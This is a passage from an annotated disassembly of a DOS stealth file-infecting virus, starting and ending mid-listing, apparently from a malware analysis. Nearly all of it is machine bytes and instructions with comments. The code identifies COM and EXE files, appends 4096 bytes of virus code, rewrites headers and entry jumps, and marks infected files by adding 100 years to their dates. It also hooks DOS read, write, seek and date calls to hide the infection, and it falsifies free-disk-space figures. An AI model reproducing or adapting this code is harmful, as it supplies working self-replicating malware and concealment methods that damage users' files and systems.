0709 72 6E                   JB 0779                    ; Error ?  0779
070B 2E 80 26 B3 12 FE       AND CS:B[012B3],0FE        ; Clear Carry Flag
0711 83 FE 01                CMP SI,1                   ; IP == 0001 ?  0739
0714 74 23                   JE 0739                    ; Mark of file infected
0716 8B 04                   MOV AX,W[SI]               ; AX = CS:[IP]
0718 03 44 02                ADD AX,W[SI+2]             ; AX+= CS:[IP+2]
071B 03 44 04                ADD AX,W[SI+4]             ; AX+= CS:[IP+4]
071E 75 45                   JNZ 0765                   ; AX == 0000 ?  0765
0720 8B 5C 01                MOV BX,W[SI+1]             ; BX = CS:[IP+1]
0723 8B 80 9F FD             MOV AX,W[BX+SI+0FD9F]
0727 89 04                   MOV W[SI],AX
0729 8B 80 A1 FD             MOV AX,W[BX+SI+0FDA1]
072D 89 44 02                MOV W[SI+2],AX
0730 8B 80 A3 FD             MOV AX,W[BX+SI+0FDA3]
0734 89 44 04                MOV W[SI+4],AX
0737 EB 2C                   JMP 0765
                                                        ; Here if seems to be
                                                        ; already infected
0739 8B 16 1A 00             MOV DX,W[01A]              ; DX = 01BC
073D E8 31 02                CALL 0971                  ; [12A3] = PSP Segment
0740 2E 8B 0E A3 12          MOV CX,CS:W[012A3]         ; CX= PSP Segment
0745 83 C1 10                ADD CX,010                 ; CX+=0010
0748 03 D1                   ADD DX,CX                  ; DX=PSP Segment + 01CC
074A 26 89 57 14             MOV ES:W[BX+014],DX        ; CS = Original CS
074E A1 18 00                MOV AX,W[018]              ; AX = Original IP
0751 26 89 47 12             MOV ES:W[BX+012],AX        ; IP = Original IP
0755 A1 12 00                MOV AX,W[012]              ; AX = Original SS
0758 03 C1                   ADD AX,CX                  ; AX = SS Displaced + CS
075A 26 89 47 10             ES MOV W[BX+010],AX        ; SS = Original SS
075E A1 14 00                MOV AX,W[014]              ; AX = Original SP
0761 26 89 47 0E             ES MOV W[BX+0E],AX         ; SP = Original SP
0765 E8 09 02                CALL 0971                  ; [12A3] = PSP Segment
0768 2E 8E 1E A3 12          MOV DS,CS:W[012A3]         ; DS = PSP Segment
076D 8B 46 02                MOV AX,W[BP+2]             ; AX = (*)
0770 A3 0A 00                MOV W[0A],AX
0773 8B 46 04                MOV AX,W[BP+4]
0776 A3 0C 00                MOV W[0C],AX
0779 E9 1A FC                JMP 0396

                        ; External INT 21/30 Entry Point
                        ; Get DOS Version Number
                        ; Return:
                        ;       AL = Int (Version)
                        ;       AH = Frac(Version)
                        ;       BX = 0000
                        ;       CX = 0000

077C 2E C6 06 F0 12 00       CS MOV B[012F0],0
0782 B4 2A                   MOV AH,02A
0784 E8 0D 07                CALL 0E94                  ; INT 21
0787 81 FA 16 09             CMP DX,0916
078B 72 03                   JB 0790
078D E8 22 08                CALL 0FB2
0790 E9 7C FB                JMP 030F                   ; Exec old 21h and Ret

                        ; Subrutine.

0793 E8 30 05                CALL 0CC6                  ; Make [122D] -> INT 13
0796 E8 BC 00                CALL 0855                  ; DX:DI:SI = File Length
                                                        ; Read Header,Date,Time
0799 C6 06 20 00 01          MOV B[020],1               ; [0020] = 01 (If EXE)
079E 81 3E 00 12 4D 5A       CMP W[01200],05A4D         ; 
07A4 74 0E                   JE 07B4                    ; Starts with 'MZ'? 
07A6 81 3E 00 12 5A 4D       CMP W[01200],04D5A         ; 
07AC 74 06                   JE 07B4                    ; Starts with 'ZM'? 
07AE FE 0E 20 00             DEC B[020]                 ; [0020] = 00 (If COM)
07B2 74 58                   JE 080C                    ; COM ?  080C
07B4 A1 04 12                MOV AX,W[01204]            ; AX = File Size mod 512
07B7 D1 E1                   SHL CX,1                   ; CX = 20h
07B9 F7 E1                   MUL CX                     ; AX = File Size mod 10h
07BB 05 00 02                ADD AX,0200                ; AX += 200h
07BE 3B C6                   CMP AX,SI                  ; Size in Header ? FSize
07C0 72 48                   JB 080A                    ; Have Overlays?  Ret
07C2 A1 0A 12                MOV AX,W[0120A]            ; AX = Min Paragraphs
07C5 0B 06 0C 12             OR AX,W[0120C]             ; AX|= Max Paragraphs
07C9 74 3F                   JE 080A                    ; Memory Needed == 0 ? 
07CB A1 A9 12                MOV AX,W[012A9]            ;
07CE 8B 16 AB 12             MOV DX,W[012AB]            ; DX:AX = File Length
07D2 B9 00 02                MOV CX,0200                ; CX = 0200
07D5 F7 F1                   DIV CX                     ; DX:AX /= 0200 (512)
                                                        ; If File Size > 2M
                                                        ; Divede By Zero Error
                                                        ; Will PopUp
07D7 0B D2                   OR DX,DX                   ;
07D9 74 01                   JE 07DC                    ; Remainder = 0? 
07DB 40                      INC AX                     ; AX++
07DC A3 04 12                MOV W[01204],AX            ; Size in 200h Paras
07DF 89 16 02 12             MOV W[01202],DX            ; Remainder of Legnth
                                                        ; The DOS will load
                                                        ; the whole file with
                                                        ; its internal overlays
07E3 83 3E 14 12 01          CMP W[01214],1             ; 
07E8 74 62                   JE 084C                    ; initial IP = 0001 ? Rt
07EA C7 06 14 12 01 00       MOV W[01214],1             ; Do Initial IP = 0001
07F0 8B C6                   MOV AX,SI                  ; AX = File Size Mod 0F
07F2 2B 06 08 12             SUB AX,W[01208]            ; AX -= Header Size % 0F
07F6 A3 16 12                MOV W[01216],AX            ; Initial CS = File Size
07F9 83 06 04 12 08          ADD W[01204],8             ; Add 4K to File Size
07FE A3 0E 12                MOV W[0120E],AX            ; Initial SS = File Size
0801 C7 06 10 12 00 10       MOV W[01210],01000         ; Initial SP = 1000h
0807 E8 A9 00                CALL 08B3                  ; Write 4096 Code
080A EB 40                   JMP 084C                   ; Return
                                                        ; Here If file is a COM
080C 81 FE 00 0F             CMP SI,0F00                ;
0810 73 3A                   JAE 084C                   ; SI >= 60k ? Return
0812 A1 00 12                MOV AX,W[01200]            ; AX = First Word
0815 A3 04 00                MOV W[4],AX                ; [0004] = First Word
                                                        ; I think this is already
                                                        ; done.
0818 03 D0                   ADD DX,AX                  ; DX = 0000+1 Word
                                                        ; DX = File Paras but
                                                        ; file is COM=>Paras = 0
081A A1 02 12                MOV AX,W[01202]            ; AX = Second Word
081D A3 06 00                MOV W[6],AX                ; [0006] = Second Word
0820 03 D0                   ADD DX,AX                  ; DX += Second Word
0822 A1 04 12                MOV AX,W[01204]            ; AX = Third Word
0825 A3 08 00                MOV W[8],AX                ; [0008] = Third Word
0828 03 D0                   ADD DX,AX                  ; DX += Third Word
082A 74 20                   JE 084C                    ; 1Word+2Word+3Word=0 ?
082C B1 E9                   MOV CL,0E9                 ; CL = E9
082E 88 0E 00 12             MOV B[01200],CL            ; [1200] = JMP
0832 B8 10 00                MOV AX,010                 ;
0835 F7 E6                   MUL SI                     ; AX = File Paras * 10h
0837 05 65 02                ADD AX,0265                ; AX += 265
083A A3 01 12                MOV W[01201],AX            ; [1201] = 265 JMP 0268
083D A1 00 12                MOV AX,W[01200]            ;
0840 03 06 02 12             ADD AX,W[01202]
0844 F7 D8                   NEG AX
0846 A3 04 12                MOV W[01204],AX
0849 E8 67 00                CALL 08B3
084C B4 3E                   MOV AH,03E                 ; AH = 3E
084E E8 43 06                CALL 0E94                  ; INT 21 | Close File
0851 E8 18 05                CALL 0D6C                  ; Restore INTs 13h & 24h
0854 C3                      RET

                        ; Subrutine. Gate Date&Time, Read Header, Seek EOF
                        ; Input:
                        ;   BX      Openned File Handle
                        ; Output:
                        ;   [1229] = File Time
                        ;   [122B] = File Date
                        ;   [12A9] = File Length
                        ;   DX:DI:SI = File Length

0855 0E                      PUSH CS                    ;
0856 1F                      POP DS                     ; DS = CS
0857 B8 00 57                MOV AX,05700               ; AX = 5700
085A E8 37 06                CALL 0E94                  ; INT 21 | Get D & T
085D 89 0E 29 12             MOV W[01229],CX            ; [1229] = File Time
0861 89 16 2B 12             MOV W[0122B],DX            ; [122B] = File Date
0865 B8 00 42                MOV AX,04200               ; AX = 4200
0868 33 C9                   XOR CX,CX                  ; CX = 0000
086A 8B D1                   MOV DX,CX                  ; DX = 0000
086C E8 25 06                CALL 0E94                  ; INT 21 | Reset File
086F B4 3F                   MOV AH,03F                 ; AH = 3F
0871 B1 1C                   MOV CL,01C                 ; CL = 1C
0873 BA 00 12                MOV DX,01200               ; DX = 1200
0876 E8 1B 06                CALL 0E94                  ; INT 21 | Read EXE Head
0879 B8 00 42                MOV AX,04200               ; AX = 4200
087C 33 C9                   XOR CX,CX                  ; CX = 0000
087E 8B D1                   MOV DX,CX                  ; DX = 0000
0880 E8 11 06                CALL 0E94                  ; INT 21 | Reset File
0883 B4 3F                   MOV AH,03F                 ; AH = 3F
0885 B1 1C                   MOV CL,01C                 ; CL = 1C
0887 BA 04 00                MOV DX,4                   ; DX = 0004
088A E8 07 06                CALL 0E94                  ; INT 21 | Read EXE Head
088D B8 02 42                MOV AX,04202               ; AX = 4202
0890 33 C9                   XOR CX,CX                  ; CX = 0000
0892 8B D1                   MOV DX,CX                  ; DX = 0000
0894 E8 FD 05                CALL 0E94                  ; INT 21 | Seek EOF
0897 A3 A9 12                MOV W[012A9],AX            ; [12A9] = File Length
089A 89 16 AB 12             MOV W[012AB],DX            ;
089E 8B F8                   MOV DI,AX                  ; DI = File Length&FFFF
08A0 05 0F 00                ADD AX,0F                  ;
08A3 83 D2 00                ADC DX,0                   ; Round Up File Length
08A6 25 F0 FF                AND AX,-010                ; To Next Paragraph
08A9 2B F8                   SUB DI,AX                  ; DI =Offset Rounded Dwn
08AB B9 10 00                MOV CX,010                 ;
08AE F7 F1                   DIV CX                     ; AX = Offset Size in
                                                        ;      10h Bytes Paras
08B0 8B F0                   MOV SI,AX                  ; SI = AX
08B2 C3                      RET

                        ; Subrutine. Write 4096 Code To EOF
                        ; Input:
                        ;   BX = Handle

08B3 B8 00 42                MOV AX,04200               ; AX = 4200
08B6 33 C9                   XOR CX,CX                  ; CX = 0000
08B8 8B D1                   MOV DX,CX                  ; DX = 0000
08BA E8 D7 05                CALL 0E94                  ; INT 21 | Reset File
08BD B4 40                   MOV AH,040                 ; AH = 40
08BF B1 1C                   MOV CL,01C                 ; CL = 1C
08C1 BA 00 12                MOV DX,01200               ; DX = 1200
08C4 E8 CD 05                CALL 0E94                  ; INT 21 | Write Header
08C7 B8 10 00                MOV AX,010                 ; AX = 0010
08CA F7 E6                   MUL SI                     ; AX = File Size Segment
08CC 8B CA                   MOV CX,DX                  ; CX = 1200
08CE 8B D0                   MOV DX,AX                  ; DX = File Size Segment
08D0 B8 00 42                MOV AX,04200               ; AX = 4200
08D3 E8 BE 05                CALL 0E94                  ; INT 21 | Seek EOF
08D6 33 D2                   XOR DX,DX                  ; DX = 0000
08D8 B9 00 10                MOV CX,01000               ; CX = 1000 (4K)
08DB 03 CF                   ADD CX,DI                  ; CX += File Offsets
08DD B4 40                   MOV AH,040                 ; AH = 40
08DF E8 B2 05                CALL 0E94                  ; INT 21 | Write 4096
08E2 B8 01 57                MOV AX,05701               ; AX = 5701
08E5 8B 0E 29 12             MOV CX,W[01229]            ;
08E9 8B 16 2B 12             MOV DX,W[0122B]            ;
08ED F6 C6 80                TEST DH,080                ;
08F0 75 03                   JNE 08F5                   ; Is Last Bit On? 
08F2 80 C6 C8                ADD DH,0C8                 ; Add 100 Years to FDate
08F5 E8 9C 05                CALL 0E94                  ; INT 21 | Set Date & Tm
08F8 80 3E EE 12 03          CMP B[012EE],3             ;
08FD 72 19                   JB RET                     ; DOS < 3.00 ?  Ret
08FF 80 3E EF 12 00          CMP B[012EF],0             ; Called inside EXEC?
0904 74 12                   JE RET                     ; If NOT  Ret
0906 53                      PUSH BX                    ; BX = Handle
0907 8A 16 28 12             MOV DL,B[01228]            ; DL = Drive
090B B4 32                   MOV AH,032                 ; AH = 32
090D E8 84 05                CALL 0E94                  ; INT 21 | DS:BX -> DPB
0910 2E A1 EC 12             MOV AX,CS:W[012EC]         ; AX = Free Clusters
0914 89 47 1E                MOV W[BX+01E],AX           ; Free Clusters = Free
                                                        ; Clusters Before infect
                                                        ; BUG In DOS 4++
0917 5B                      POP BX                     ; BX = Handle
0918 C3                      RET                        ; Return

0919 E8 D3 04                CALL 0DEF
091C 8B FA                   MOV DI,DX
091E 83 C7 0D                ADD DI,0D
0921 1E                      PUSH DS
0922 07                      POP ES
0923 EB 20                   JMP 0945

                        ; Subrutine. Check if file name is .EXE, .COM or not.
                        ; Input:
                        ;    DS:DX -> ASCIIZ File Name
                        ; Output:
                        ;   If Carry Set, the name pointed isn't .COM or .EXE
                        ;   If Carry Clear:
                        ;                   [0020] = 00     .COM
                        ;                   [0020] = 01     .EXE

0925 E8 C7 04                CALL 0DEF                  ; Set 4096 Stack & PushA
0928 1E                      PUSH DS                    ;
0929 07                      POP ES                     ; ES = DS
092A 8B FA                   MOV DI,DX                  ; DI = DX
092C B9 50 00                MOV CX,050                 ; CX = 0050
092F 33 C0                   XOR AX,AX                  ; AX = 0000
0931 B3 00                   MOV BL,0                   ; BL = 00
0933 80 7D 01 3A             CMP B[DI+1],03A            ; 
0937 75 05                   JNE 093E                   ; [DX+1] != ':' ?  093E
0939 8A 1D                   MOV BL,B[DI]               ; BL = Drive letter
093B 80 E3 1F                AND BL,01F                 ; BL &= 1F (Drv for ltr)
093E 2E 88 1E 28 12          MOV CS:B[01228],BL         ; [1228] = Drive Number
0943 F2 AE                   REPNE SCASB                ; Find Name End
0945 8B 45 FD                MOV AX,W[DI-3]             ; AX='EX'   | AX='CO'
                                                        ;(4558|6578)|(434D|636D)
0948 25 DF DF                AND AX,0DFDF 1101 1111b    ;    4558   |   434F
094B 02 E0                   ADD AH,AL                  ;  AH = 9D  |  AH = 90
094D 8A 45 FC                MOV AL,B[DI-4]             ; AL=(45|65)|AL=(4F|6F)
0950 24 DF                   AND AL,0DF                 ;  AL = 45  |  AL = 4F
0952 02 C4                   ADD AL,AH                  ;  AL = E2  |  AL = DF
0954 2E C6 06 20 00 00       MOV CS:B[020],0            ; [0020] = 00
095A 3C DF                   CMP AL,0DF                 ; File Name is a .COM ?
095C 74 09                   JE 0967                    ; If .COM  Clear Carry
095E 2E FE 06 20 00          INC CS:B[020]              ; [0020] = 01
0963 3C E2                   CMP AL,0E2                 ; AL = E2 ?
0965 75 05                   JNE 096C                   ; No es EXE ?  Set Crry
0967 E8 7C 04                CALL 0DE6                  ; Set 4096 Stack & PopA
096A F8                      CLC                        ; Clear Carry
096B C3                      RET                        ; Return
096C E8 77 04                CALL 0DE6                  ; Set 4096 Stack & PopA
096F F9                      STC                        ; Set Carry
0970 C3                      RET                        ; Return

                        ; Subrutine. Get PSP Segment to [12A3]

0971 53                      PUSH BX                    ; BX = BX
0972 B4 51                   MOV AH,051                 ; AH = 51h Get PSP Addrs
0974 E8 1D 05                CALL 0E94                  ; INT 21h  BX = PSP Seg
0977 2E 89 1E A3 12          CS MOV W[012A3],BX         ; [12A3] = Psp Segment
097C 5B                      POP BX                     ; BX = Entry BX
097D C3                      RET                        ;

                        ; Subrutine. Open File for R/W
                        ; Input:
                        ;   ES:DX -> File Name
                        ;   [1228] = Drive Number
                        ; Output:
                        ;   BX = FFFF           If Error
                        ;        Handle         If Not Error
                        ;   [12EC] = Free Clusters

097E E8 45 03                CALL 0CC6                  ; Make [122D] -> INT 13
0981 52                      PUSH DX                    ; ES:DX -> File Name
0982 2E 8A 16 28 12          CS MOV DL,B[01228]         ; DL = Drive Number
0987 B4 36                   MOV AH,036                 ; Get Free Disk Space
0989 E8 08 05                CALL 0E94                  ; INT 21
098C F7 E1                   MUL CX                     ; AX = Sectors * Bytes
098E F7 E3                   MUL BX                     ; AX = Free Bytes on Dsk
0990 8B DA                   MOV BX,DX                  ; BX = Total Clusters
0992 5A                      POP DX                     ; DX = File Name
0993 0B DB                   OR BX,BX                   ;
0995 75 05                   JNE 099C                   ; Total Clusters!=00? 
0997 3D 00 40                CMP AX,04000               ;
099A 72 43                   JB 09DF                    ; Free Bytes < 16K ? 
099C B8 00 43                MOV AX,04300               ; Get File Attributes
099F E8 F2 04                CALL 0E94                  ; INT 21 | CX = Attrs
09A2 72 3B                   JB 09DF                    ; Error ?  09DF
09A4 8B F9                   MOV DI,CX                  ; DI = Attrs
09A6 33 C9                   XOR CX,CX                  ; CX = 0000
09A8 B8 01 43                MOV AX,04301               ; Set Attributes
09AB E8 E6 04                CALL 0E94                  ; INT 21 | Clear all Att
09AE 2E 80 3E DA 12 00       CS CMP B[012DA],0          ; Are IRQ's on BIOS ?
09B4 75 29                   JNE 09DF                   ; Aren't 
09B6 B8 02 3D                MOV AX,03D02               ; Open file for R/W
09B9 E8 D8 04                CALL 0E94                  ; INT 21
09BC 72 21                   JB 09DF                    ; Error ? 09DF
09BE 8B D8                   MOV BX,AX                  ; BX = File Handle
09C0 8B CF                   MOV CX,DI                  ; CX = Orig. File Attrs
09C2 B8 01 43                MOV AX,04301               ; Restore Attributes
09C5 E8 CC 04                CALL 0E94                  ; INT 21
09C8 53                      PUSH BX                    ; BX = File Handle
09C9 2E 8A 16 28 12          CS MOV DL,B[01228]         ; DL = Drive Number
09CE B4 32                   MOV AH,032                 ; Get Drive Param Blk
09D0 E8 C1 04                CALL 0E94                  ; INT 21 : DS:BX -> DPB
09D3 8B 47 1E                MOV AX,W[BX+01E]           ; AX = Free clusters
                                                        ; For DOS 2.XX is two
                                                        ;    first letters of
                                                        ;    current directory
                                                        ; For DOS 3.XX is Free
                                                        ;    Clusters on Drive
                                                        ; For DOS 4.0-5.0 is
                                                        ;    Half & Half Word
09D6 2E A3 EC 12             CS MOV W[012EC],AX         ; [12EC] = Free Clusters
09DA 5B                      POP BX                     ; BX = File Handle
09DB E8 8E 03                CALL 0D6C                  ; Restore INTs 13h & 24h
09DE C3                      RET                        ; Return
09DF 33 DB                   XOR BX,BX                  ;
09E1 4B                      DEC BX                     ; BX = FFFF
09E2 E8 87 03                CALL 0D6C                  ; Restore INTs 13h & 24h
09E5 C3                      RET                        ; Return

09E6 51                      PUSH CX
09E7 52                      PUSH DX
09E8 50                      PUSH AX
09E9 B8 00 44                MOV AX,04400
09EC E8 A5 04                CALL 0E94                  ; INT 21
09EF 80 F2 80                XOR DL,080
09F2 F6 C2 80                TEST DL,080
09F5 74 09                   JE 0A00
09F7 B8 00 57                MOV AX,05700
09FA E8 97 04                CALL 0E94                  ; INT 21
09FD F6 C6 80                TEST DH,080
0A00 58                      POP AX
0A01 5A                      POP DX
0A02 59                      POP CX
0A03 C3                      RET
0A04 E8 E8 03                CALL 0DEF
0A07 B8 01 42                MOV AX,04201
0A0A 33 C9                   XOR CX,CX
0A0C 33 D2                   XOR DX,DX
0A0E E8 83 04                CALL 0E94                  ; INT 21
0A11 2E A3 A5 12             CS MOV W[012A5],AX
0A15 2E 89 16 A7 12          CS MOV W[012A7],DX
0A1A B8 02 42                MOV AX,04202
0A1D 33 C9                   XOR CX,CX
0A1F 33 D2                   XOR DX,DX
0A21 E8 70 04                CALL 0E94                  ; INT 21
0A24 2E A3 A9 12             CS MOV W[012A9],AX
0A28 2E 89 16 AB 12          CS MOV W[012AB],DX
0A2D B8 00 42                MOV AX,04200
0A30 2E 8B 16 A5 12          CS MOV DX,W[012A5]
0A35 2E 8B 0E A7 12          CS MOV CX,W[012A7]
0A3A E8 57 04                CALL 0E94                  ; INT 21
0A3D E8 A6 03                CALL 0DE6                  ; Set 4096 Stack & PopA
0A40 C3                      RET

                        ; External INT 21/57 Entry Point
                        ; Get Set File Date & Time Using Handle
                        ; Input:
                        ;       AL = 00         Get Date & Time
                        ;       AL = 01         Set Date & Time
                        ;       BX = Handle     File Handle
                        ;       CX = Time       Time to Set if AL = 01
                        ;       DX = Date       Date to Set if AL = 01
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Error Code If CF = 1
                        ;       CX = Time       File's Time if AL = 0 (on input)
                        ;       DX = Date       File's Date if AL = 0 (on input)

0A41 0A C0                   OR AL,AL
0A43 75 22                   JNE 0A67
0A45 2E 83 26 B3 12 FE       CS AND W[012B3],-2
0A4B E8 85 03                CALL 0DD3                  ; popa
0A4E E8 43 04                CALL 0E94                  ; INT 21
0A51 72 0B                   JB 0A5E
0A53 F6 C6 80                TEST DH,080
0A56 74 03                   JE 0A5B
0A58 80 EE C8                SUB DH,0C8
0A5B E9 E1 F8                JMP 033F                   ; Return
0A5E 2E 83 0E B3 12 01       CS OR W[012B3],1
0A64 E9 D8 F8                JMP 033F                   ; Return
0A67 3C 01                   CMP AL,1
0A69 75 37                   JNE 0AA2
0A6B 2E 83 26 B3 12 FE       CS AND W[012B3],-2
0A71 F6 C6 80                TEST DH,080
0A74 74 03                   JE 0A79
0A76 80 EE C8                SUB DH,0C8
0A79 E8 6A FF                CALL 09E6
0A7C 74 03                   JE 0A81
0A7E 80 C6 C8                ADD DH,0C8
0A81 E8 10 04                CALL 0E94                  ; INT 21
0A84 89 46 FC                MOV W[BP-4],AX
0A87 2E 83 16 B3 12 00       CS ADC W[012B3],0
0A8D E9 06 F9                JMP 0396

                        ; External INT 21/42 Entry Point
                        ; Move File Pointer Using Handle
                        ; Input:
                        ;       AL = Origin     Origin Of Move
                        ;            00         From Begini Of File
                        ;            01         From Current Position
                        ;            02         From End Of File
                        ;       BX = Handle     File Handle
                        ;    CX|DX = Count      Longint Bytes to Move
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Error Code If CF = 1
                        ;    DX|AX = Position   New Absolute Pointer Location

0A90 3C 02                   CMP AL,2
0A92 75 0E                   JNE 0AA2
0A94 E8 4F FF                CALL 09E6
0A97 74 09                   JE 0AA2
0A99 81 6E F6 00 10          SUB W[BP-0A],01000
0A9E 83 5E F8 00             SBB W[BP-8],0
0AA2 E9 6A F8                JMP 030F                   ; Exec old 21h and Ret

                        ; External INT 21/3F Entry Point
                        ; Read from File or Device Using Handle
                        ; Input:
                        ;       BX = Handle     File Handle
                        ;       CX = Count      Number of Byte to Read
                        ;   DS:DX -> Buffer
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Count      Number Of Bytes Read If CF = 0
                        ;       AX = Error Code If CF = 1
                        ;   DS:DX -> Buffer     Filled in With Read Data

0AA5 2E 80 26 B3 12 FE       CS AND B[012B3],0FE
0AAB E8 38 FF                CALL 09E6
0AAE 74 F2                   JE 0AA2
0AB0 2E 89 0E AF 12          CS MOV W[012AF],CX
0AB5 2E 89 16 AD 12          CS MOV W[012AD],DX
0ABA 2E C7 06 B1 12 00 00    CS MOV W[012B1],0
0AC1 E8 40 FF                CALL 0A04
0AC4 2E A1 A9 12             CS MOV AX,W[012A9]
0AC8 2E 8B 16 AB 12          CS MOV DX,W[012AB]
0ACD 2D 00 10                SUB AX,01000
0AD0 83 DA 00                SBB DX,0
0AD3 2E 2B 06 A5 12          CS SUB AX,W[012A5]
0AD8 2E 1B 16 A7 12          CS SBB DX,W[012A7]
0ADD 79 08                   JNS 0AE7
0ADF C7 46 FC 00 00          MOV W[BP-4],0
0AE4 E9 62 FA                JMP 0549
0AE7 75 08                   JNE 0AF1
0AE9 3B C1                   CMP AX,CX
0AEB 77 04                   JA 0AF1
0AED 2E A3 AF 12             CS MOV W[012AF],AX
0AF1 2E 8B 16 A5 12          CS MOV DX,W[012A5]
0AF6 2E 8B 0E A7 12          CS MOV CX,W[012A7]
0AFB 0B C9                   OR CX,CX
0AFD 75 05                   JNE 0B04
0AFF 83 FA 1C                CMP DX,01C
0B02 76 1A                   JBE 0B1E
0B04 2E 8B 16 AD 12          CS MOV DX,W[012AD]
0B09 2E 8B 0E AF 12          CS MOV CX,W[012AF]
0B0E B4 3F                   MOV AH,03F
0B10 E8 81 03                CALL 0E94                  ; INT 21
0B13 2E 03 06 B1 12          CS ADD AX,W[012B1]
0B18 89 46 FC                MOV W[BP-4],AX
0B1B E9 78 F8                JMP 0396
0B1E 8B F2                   MOV SI,DX
0B20 8B FA                   MOV DI,DX
0B22 2E 03 3E AF 12          CS ADD DI,W[012AF]
0B27 83 FF 1C                CMP DI,01C
0B2A 72 04                   JB 0B30
0B2C 33 FF                   XOR DI,DI
0B2E EB 05                   JMP 0B35
0B30 83 EF 1C                SUB DI,01C
0B33 F7 DF                   NEG DI
0B35 8B C2                   MOV AX,DX
0B37 2E 8B 0E AB 12          CS MOV CX,W[012AB]
0B3C 2E 8B 16 A9 12          CS MOV DX,W[012A9]
0B41 83 C2 0F                ADD DX,0F
0B44 83 D1 00                ADC CX,0
0B47 83 E2 F0                AND DX,-010
0B4A 81 EA FC 0F             SUB DX,0FFC
0B4E 83 D9 00                SBB CX,0
0B51 03 D0                   ADD DX,AX
0B53 83 D1 00                ADC CX,0
0B56 B8 00 42                MOV AX,04200
0B59 E8 38 03                CALL 0E94                  ; INT 21
0B5C B9 1C 00                MOV CX,01C
0B5F 2B CF                   SUB CX,DI
0B61 2B CE                   SUB CX,SI
0B63 B4 3F                   MOV AH,03F
0B65 2E 8B 16 AD 12          CS MOV DX,W[012AD]
0B6A E8 27 03                CALL 0E94                  ; INT 21
0B6D 2E 01 06 AD 12          CS ADD W[012AD],AX
0B72 2E 29 06 AF 12          CS SUB W[012AF],AX
0B77 2E 01 06 B1 12          CS ADD W[012B1],AX
0B7C 33 C9                   XOR CX,CX
0B7E BA 1C 00                MOV DX,01C
0B81 B8 00 42                MOV AX,04200
0B84 E8 0D 03                CALL 0E94                  ; INT 21
0B87 E9 7A FF                JMP 0B04

                        ; External INT 21/40 Entry Point
                        ; Write to File or Device Using Handle
                        ; Input:
                        ;       BX = Handle     File Handle
                        ;       CX = Count      Number of Bytes to Write
                        ;   DS:DX -> Buffer
                        ; Return:
                        ;       CF = 1          If Error
                        ;       AX = Count      Number Of Bytes Writen
                        ;       AX = Error Code If CF = 1

0B8A 2E 80 26 B3 12 FE       CS AND B[012B3],0FE
0B90 E8 53 FE                CALL 09E6                    (*)
0B93 75 03                   JNE 0B98
0B95 E9 0A FF                JMP 0AA2
0B98 2E 89 0E AF 12          CS MOV W[012AF],CX
0B9D 2E 89 16 AD 12          CS MOV W[012AD],DX
0BA2 2E C7 06 B1 12 00 00    CS MOV W[012B1],0
0BA9 E8 58 FE                CALL 0A04
0BAC 2E A1 A9 12             CS MOV AX,W[012A9]
0BB0 2E 8B 16 AB 12          CS MOV DX,W[012AB]
0BB5 2D 00 10                SUB AX,01000
0BB8 83 DA 00                SBB DX,0
0BBB 2E 2B 06 A5 12          CS SUB AX,W[012A5]
0BC0 2E 1B 16 A7 12          CS SBB DX,W[012A7]
0BC5 78 02                   JS 0BC9
0BC7 EB 7E                   JMP 0C47
0BC9 E8 FA 00                CALL 0CC6                  ; Make [122D] -> INT 13
0BCC 0E                      PUSH CS
0BCD 1F                      POP DS
0BCE 8B 16 A9 12             MOV DX,W[012A9]
0BD2 8B 0E AB 12             MOV CX,W[012AB]
0BD6 83 C2 0F                ADD DX,0F
0BD9 83 D1 00                ADC CX,0
0BDC 83 E2 F0                AND DX,-010
0BDF 81 EA FC 0F             SUB DX,0FFC
0BE3 83 D9 00                SBB CX,0
0BE6 B8 00 42                MOV AX,04200
0BE9 E8 A8 02                CALL 0E94                  ; INT 21
0BEC BA 04 00                MOV DX,4
0BEF B9 1C 00                MOV CX,01C
0BF2 B4 3F                   MOV AH,03F
0BF4 E8 9D 02                CALL 0E94                  ; INT 21
0BF7 B8 00 42                MOV AX,04200
0BFA 33 C9                   XOR CX,CX
0BFC 8B D1                   MOV DX,CX
0BFE E8 93 02                CALL 0E94                  ; INT 21
0C01 BA 04 00                MOV DX,4
0C04 B9 1C 00                MOV CX,01C
0C07 B4 40                   MOV AH,040
0C09 E8 88 02                CALL 0E94                  ; INT 21
0C0C BA 00 F0                MOV DX,0F000
0C0F B9 FF FF                MOV CX,-1
0C12 B8 02 42                MOV AX,04202
0C15 E8 7C 02                CALL 0E94                  ; INT 21
0C18 B4 40                   MOV AH,040
0C1A 33 C9                   XOR CX,CX
0C1C E8 75 02                CALL 0E94                  ; INT 21
0C1F 8B 16 A5 12             MOV DX,W[012A5]
0C23 8B 0E A7 12             MOV CX,W[012A7]
0C27 B8 00 42                MOV AX,04200
0C2A E8 67 02                CALL 0E94                  ; INT 21
0C2D B8 00 57                MOV AX,05700
0C30 E8 61 02                CALL 0E94                  ; INT 21
0C33 F6 C6 80                TEST DH,080
0C36 74 09                   JE 0C41
0C38 80 EE C8                SUB DH,0C8
0C3B B8 01 57                MOV AX,05701
0C3E E8 53 02                CALL 0E94                  ; INT 21
0C41 E8 28 01                CALL 0D6C                  ; Restore INTs 13h & 24h
0C44 E9 C8 F6                JMP 030F                   ; Exec old 21h and Ret
0C47 75 07                   JNE 0C50
0C49 3B C1                   CMP AX,CX
0C4B 77 03                   JA 0C50
0C4D E9 79 FF                JMP 0BC9
0C50 2E 8B 16 A5 12          CS MOV DX,W[012A5]
0C55 2E 8B 0E A7 12          CS MOV CX,W[012A7]
0C5A 0B C9                   OR CX,CX
0C5C 75 08                   JNE 0C66
0C5E 83 FA 1C                CMP DX,01C
0C61 77 03                   JA 0C66
0C63 E9 63 FF                JMP 0BC9
0C66 E8 6A 01                CALL 0DD3                  ; popa
0C69 E8 28 02                CALL 0E94                  ; INT 21
0C6C E8 38 01                CALL 0DA7                  ; PushA
0C6F B8 00 57                MOV AX,05700
0C72 E8 1F 02                CALL 0E94                  ; INT 21
0C75 F6 C6 80                TEST DH,080
0C78 75 09                   JNE 0C83
0C7A 80 C6 C8                ADD DH,0C8
0C7D B8 01 57                MOV AX,05701
0C80 E8 11 02                CALL 0E94                  ; INT 21
0C83 E9 10 F7                JMP 0396
0C86 E9 86 F6                JMP 030F                   ; Exec old 21h and Ret

                        ; External INT 13 Entry Point

0C89 2E 8F 06 41 12          POP CS:W[01241]            ; [1241]=INT 13 Offset
0C8E 2E 8F 06 43 12          POP CS:W[01243]            ; [1243]=INT 13 Segment
